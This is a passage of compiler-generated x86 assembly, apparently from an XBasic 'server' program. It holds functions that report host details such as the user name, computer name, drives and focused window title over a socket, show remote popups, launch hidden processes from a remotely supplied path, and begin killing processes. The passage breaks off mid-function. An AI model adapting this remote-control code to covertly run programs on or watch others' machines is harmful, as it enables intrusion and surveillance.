	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
	jmp	end.if.00F7.server			;;; i107
else.00F7.server:
	mov	eax,addr @_string.04BF.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
end.if.00F7.server:
;
; [2444] IFZ of THEN of = OpenEventLog()
	mov	eax,d[%of.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.00F8.server			;;; i195
	call	func58.server			;;; i619
	mov	d[%of.server],eax			;;; i668
else.00F8.server:
end.if.00F8.server:
;
; [2446] SendMsg (socket,"CMSG --- "+ #IPAddr$+":"+STRING$(#Port)+" status ---")
	mov	eax,addr @_string.0416.server			;;; i663
	mov	ebx,[%#IPAddr$.server]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0121.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk2D.0000 = ebp-56	; internal variable
	mov	[ebp-56],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[%#Port.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-56]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.04C3.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2447] SendMsg (socket,"CMSG :server location\t\t"+ GetServerPath())
	call	func14.server			;;; i619
	mov	ebx,addr @_string.04C4.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2448] SendMsg (socket,"CMSG :user name\t\t"+GetUserName())
	call	func1A.server			;;; i619
	mov	ebx,addr @_string.04C5.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2449] SendMsg (socket,"CMSG :computer name\t\t"+GetComputerName())
	call	func19.server			;;; i619
	mov	ebx,addr @_string.04C6.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2450] SendMsg (socket,"CMSG :start time\t\t"+ #startTime$+" "+ #startDate$)
	mov	eax,addr @_string.04C7.server			;;; i663
	mov	ebx,[%#startTime$.server]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[%#startDate$.server]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2451] SendMsg (socket,"CMSG :current time\t\t"+GetTime()+" "+GetDate())
	call	func16.server			;;; i619
	mov	ebx,addr @_string.04CA.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-56],eax			;;; i670
	call	func17.server			;;; i619
	mov	ebx,[ebp-56]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2452] SendMsg (socket,"CMSG :uptime\t\t\t"+STRING$(mins)+" minutes")
	sub	esp,64			;;; i487
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.04CB.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.04CC.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2453] SendMsg (socket,"CMSG :logical drives\t\t"+GetDrives())
	call	func1D.server			;;; i619
	mov	ebx,addr @_string.04CD.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2454] SendMsg (socket,"CMSG :windows dir\t\t"+GetWindowsDir())
	call	func1B.server			;;; i619
	mov	ebx,addr @_string.04CE.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2455] SendMsg (socket,"CMSG :system dir\t\t"+GetSystemDir())
	call	func1C.server			;;; i619
	mov	ebx,addr @_string.04CF.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2456] SendMsg (socket,"CMSG :window focus\t\t["+atitle+"]")
	mov	eax,addr @_string.04D0.server			;;; i663
	mov	ebx,[%atitle.server]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02CF.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2457] SendMsg (socket,"CMSG :systray menu\t\t"+istatus$)
	mov	eax,addr @_string.04D1.server			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2458] SendMsg (socket,"CMSG :event streaming\t\t"+estatus$)
	mov	eax,addr @_string.04D2.server			;;; i663
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2459] SendMsg (socket,"CMSG :event log size\t\t"+STRING$(LOF(of))+" bytes")
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,d[%of.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_lof
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.04D3.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.04D4.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2460] SendMsg (socket,"CMSG :server log size\t\t"+STRING$(GetEventLogSize()))
	sub	esp,64			;;; i487
	call	func5B.server			;;; i619
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.04D5.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2461] SendMsg (socket,"CMSG :data recv\t\t"+STRING$(tBytesRecvA+tBytesRecvB))
	sub	esp,64			;;; i487
	mov	eax,d[%tBytesRecvA.server]			;;; i663a
	mov	ebx,d[%tBytesRecvB.server]			;;; i663a
	add	eax,ebx			;;; i775
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.04D6.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2462] SendMsg (socket,"CMSG :data sent\t\t"+STRING$(tBytesSent))
	sub	esp,64			;;; i487
	mov	eax,d[%tBytesSent.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.04D7.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2463] SendMsg (socket,"CMSG --- status end ---")
	mov	eax,addr @_string.04D8.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2465] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2D.server			;;; i258
;
; [2466] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientStatus.server:  ;;; Function end label for Assembly Programmers.
end.func2D.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func2D.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func2D.server:
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientStatus ()  *****
;  *****
;
; [2469] FUNCTION ClientPopup (socket,STRING text)
.code
;
#ifdef ClientPopup.socket
#undef ClientPopup.socket
#endif
#define ClientPopup.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientPopup.text
#undef ClientPopup.text
#endif
#define ClientPopup.text ebp+12	; exposes function argument 'text'
;
align 16
_ClientPopup.server@8:
;  *****
;  *****  FUNCTION  ClientPopup ()  *****
;  *****
func2C.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func2C.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.361:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.361			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
funcBody2C.server:
;
; [2472] IFZ text THEN RETURN $$FALSE
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.358			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00F9.server			;;; i192
A.358:
	mov	eax,0			;;; i659
	jmp	end.func2C.server			;;; i258
else.00F9.server:
end.if.00F9.server:
;
; [2474] GetToken (@text,@title$,'|')
#ifdef ClientPopup.title$
#undef ClientPopup.title$
#endif
#define ClientPopup.title$ ebp-40	; exposes local variable 'title$'
;
	push	124			;;; i656a
	push	[ebp-40]			;;; i674a
	push	[ebp+12]			;;; i674a
	call	funcF.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	ebx,d[esp-8]			;;; i877b
	mov	[ebp+12],ecx			;;; i670
	mov	[ebp-40],ebx			;;; i670
;
; [2475] GetToken (text,@message$,0)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk2C.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
#ifdef ClientPopup.message$
#undef ClientPopup.message$
#endif
#define ClientPopup.message$ ebp-52	; exposes local variable 'message$'
;
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp-48]			;;; i674a
	call	funcF.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	add	esp,12			;;; i633
;
; [2476] SendMsg (socket,"CMSG *** popup displayed ***")
	mov	eax,addr @_string.04DD.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2477] IF MessageBoxA (0,&message$,&title$,0) THEN
;
; [0] EXTERNAL FUNCTION MessageBoxA (hwnd, lpText, lpCaption, wType)
	mov	eax,d[ebp-52]			;;; i642
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[ebp-40]			;;; i642
; .xstk2C.0001 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-60]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	call	_MessageBoxA@16			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.00FA.server			;;; i221
;
; [2478] SendMsg (socket,"CMSG *** popup clicked ***")
	mov	eax,addr @_string.04DE.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2479] END IF
else.00FA.server:
end.if.00FA.server:
;
; [2481] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2C.server			;;; i258
;
; [2482] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientPopup.server:  ;;; Function end label for Assembly Programmers.
end.func2C.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func2C.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func2C.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientPopup ()  *****
;  *****
;
; [2484] FUNCTION ClientShell (socket,STRING pathname)
.code
;
#ifdef ClientShell.socket
#undef ClientShell.socket
#endif
#define ClientShell.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientShell.pathname
#undef ClientShell.pathname
#endif
#define ClientShell.pathname ebp+12	; exposes function argument 'pathname'
;
align 16
_ClientShell.server@8:
;  *****
;  *****  FUNCTION  ClientShell ()  *****
;  *****
func29.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.365:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.365			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.366:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.366			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+68]			;;; i125a
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
funcBody29.server:
;
; [2485] STARTUPINFO sinfo
; .composites = ebp-40	; internal variable
#ifdef ClientShell.sinfo
#undef ClientShell.sinfo
#endif
#define ClientShell.sinfo ebp-44	; exposes local variable 'sinfo'
;
;
; [2486] PROCESS_INFORMATION pinfo
#ifdef ClientShell.pinfo
#undef ClientShell.pinfo
#endif
#define ClientShell.pinfo ebp-48	; exposes local variable 'pinfo'
;
;
; [2489] IFZ pathname THEN RETURN $$FALSE
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.362			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00FB.server			;;; i192
A.362:
	mov	eax,0			;;; i659
	jmp	end.func29.server			;;; i258
else.00FB.server:
end.if.00FB.server:
;
; [2490] sinfo.cb = SIZE(STARTUPINFO)
	mov	eax,68			;;; i584
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [2491] sinfo.dwFlags = $$STARTF_USESHOWWINDOW
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,1			;;; i659
	mov	d[eax+44],ebx			;;; i13b
;
; [2492] sinfo.lpReserved = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+4],ebx			;;; i13b
;
; [2493] sinfo.lpDesktop = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+8],ebx			;;; i13b
;
; [2494] sinfo.lpTitle = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+12],ebx			;;; i13b
;
; [2495] sinfo.wShowWindow = $$SW_HIDE
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	w[eax+48],bx			;;; i13b
;
; [2496] sinfo.cbReserved2 = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	w[eax+50],bx			;;; i13b
;
; [2497] sinfo.lpReserved2 = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+52],ebx			;;; i13b
;
; [2499] IF CreateProcessA (0,&pathname,0,0,0,0,0,0,&sinfo,&pinfo) THEN
;
; [0] EXTERNAL FUNCTION CreateProcessA (lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDriectory, lpStartupInfo, lpProcessInformation)
	mov	eax,d[ebp+12]			;;; i642
; .xstk29.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
; .xstk29.0001 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i642
	push	eax			;;; i667a
	push	[ebp-64]			;;; i674a
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	push	0			;;; i656a
	call	_CreateProcessA@40			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.00FC.server			;;; i221
;
; [2500] SendMsg (socket,"CMSG * process created: "+STRING$(pinfo.dwProcessId)+"  "+pathname)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+8]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.04EC.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02F6.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2501] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func29.server			;;; i258
;
; [2502] ELSE
	jmp	end.if.00FC.server			;;; i107
else.00FC.server:
;
; [2503] SendMsg (socket,"CMSG *** unable to create process: "+pathname+" ***")
	mov	eax,addr @_string.04EE.server			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03B0.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2504] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func29.server			;;; i258
;
; [2505] END IF
end.if.00FC.server:
;
; [2508] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientShell.server:  ;;; Function end label for Assembly Programmers.
end.func29.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ClientShell ()  *****
;  *****
;
; [2510] FUNCTION ClientProcKill (socket,pid)
.code
;
#ifdef ClientProcKill.socket
#undef ClientProcKill.socket
#endif
#define ClientProcKill.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientProcKill.pid
#undef ClientProcKill.pid
#endif
#define ClientProcKill.pid ebp+12	; exposes function argument 'pid'
;
align 16
_ClientProcKill.server@8:
;  *****
;  *****  FUNCTION  ClientProcKill ()  *****
;  *****
func2B.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,4				;;; ..
	xor	eax,eax			;;; ...
A.369:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.369			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,156			;;; i114a
;
funcBody2B.server:
;
; [2513] IFZ pid THEN
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.00FD.server			;;; i195
;
; [2514] SendMsg (socket,"CMSG *** invalid process id ***")
	mov	eax,addr @_string.04F1.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2515] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func2B.server			;;; i258
;
; [2516] END IF
else.00FD.server:
end.if.00FD.server:
;
; [2518] found = $$FALSE
#ifdef ClientProcKill.found
#undef ClientProcKill.found
#endif
#define ClientProcKill.found ebp-40	; exposes local variable 'found'
;
	mov	eax,0			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [2519] hwnd = FindWindowA(0,0)
#ifdef ClientProcKill.hwnd
#undef ClientProcKill.hwnd
#endif
#define ClientProcKill.hwnd ebp-44	; exposes local variable 'hwnd'
;
;
; [0] EXTERNAL FUNCTION FindWindowA (lpClassName, lpWindowName)
	push	0			;;; i656a
	push	0			;;; i656a
	call	_FindWindowA@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2520] DO WHILE (hwnd <> 0)
align 8
do.00FE.server:
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,0			;;; i684a
	je	>> end.do.00FE.server			;;; i219
;
; [2521] IF GetParent(hwnd) == 0 THEN
;
; [0] EXTERNAL FUNCTION GetParent (hwnd)
	push	[ebp-44]			;;; i674a
	call	_GetParent@4			;;; i619
	cmp	eax,0			;;; i684a
	jne	>> else.00FF.server			;;; i219
;
; [2522] GetWindowThreadProcessId(hwnd, &test_pid)
;
; [0] EXTERNAL FUNCTION GetWindowThreadProcessId (hwnd, lpdwProcessId)
#ifdef ClientProcKill.test_pid
